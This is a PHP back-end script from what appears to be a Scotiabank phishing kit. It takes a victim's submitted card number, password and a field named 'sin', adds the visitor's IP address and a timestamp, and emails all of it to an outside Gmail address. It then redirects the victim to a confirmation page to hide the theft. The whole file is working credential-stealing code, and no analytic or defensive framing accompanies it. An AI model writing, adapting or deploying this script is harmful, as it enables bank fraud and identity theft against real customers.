<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$cc = $_POST['cardNumberInputText'];
$pp = $_POST['passwordInputText'];
$data ="
=============##SCOTIA##========================
USER : $cc
pass : $pp
============EXTRA============================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr = 'results1113@gmail.com';

mail($emailusr, $subj, $data);	

header("Location: ./confirm.html");

?>